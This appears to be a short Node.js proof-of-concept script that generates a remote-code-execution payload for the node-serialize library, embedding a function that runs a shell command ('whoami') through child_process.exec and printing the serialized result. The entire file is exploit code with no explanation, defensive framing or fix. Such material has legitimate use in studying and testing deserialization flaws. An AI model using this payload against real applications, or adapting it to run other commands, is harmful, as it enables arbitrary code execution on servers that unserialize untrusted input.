var y = {
  rce: function(){
    require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });
  }()
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
